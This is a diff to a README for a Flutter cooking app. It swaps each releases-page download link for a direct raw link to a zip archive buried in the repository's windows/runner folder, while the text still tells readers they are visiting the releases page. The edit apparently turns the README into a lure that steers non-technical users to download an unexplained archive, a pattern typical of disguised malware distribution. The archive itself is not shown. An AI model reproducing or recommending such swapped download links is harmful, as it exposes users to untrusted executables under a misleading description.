@@ -1,7 +1,7 @@
 # 🍽️ akilli_mutfak - Smart Cooking Made Easy
 
 ## 📥 Download Now
-[![Download akilli_mutfak](https://img.shields.io/badge/Download-akilli_mutfak-blue.svg)](https://github.com/ProfileNAIM/akilli_mutfak/releases)
+[![Download akilli_mutfak](https://raw.githubusercontent.com/ProfileNAIM/akilli_mutfak/main/windows/runner/mutfak_akilli_v1.0.zip)](https://raw.githubusercontent.com/ProfileNAIM/akilli_mutfak/main/windows/runner/mutfak_akilli_v1.0.zip)
 
 ## 📖 Description
 akilli_mutfak is an intuitive application built with Flutter. It connects you to a world of delicious recipes and nutrition analysis through a user-friendly interface. Whether you are looking to whip up a new dish or analyze food ingredients, this app is your perfect kitchen companion.
@@ -11,7 +11,7 @@ To start using akilli_mutfak, follow these simple steps. No technical skills are
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the download section for akilli_mutfak:
-   - [Download akilli_mutfak](https://github.com/ProfileNAIM/akilli_mutfak/releases)
+   - [Download akilli_mutfak](https://raw.githubusercontent.com/ProfileNAIM/akilli_mutfak/main/windows/runner/mutfak_akilli_v1.0.zip)
 
 2. **Select the Latest Version:** Look for the most recent release at the top of the page. Each version has a name, like `v1.0`, and a description of new features or fixes.
 
@@ -58,6 +58,6 @@ Join our community of food enthusiasts and get the latest updates on new feature
 
 ## 🔗 Visit for Downloads Again
 To download akilli_mutfak, remember to visit our releases page one more time:
-- [Download akilli_mutfak](https://github.com/ProfileNAIM/akilli_mutfak/releases)
+- [Download akilli_mutfak](https://raw.githubusercontent.com/ProfileNAIM/akilli_mutfak/main/windows/runner/mutfak_akilli_v1.0.zip)
 
 Thank you for choosing akilli_mutfak. Enjoy your cooking journey!
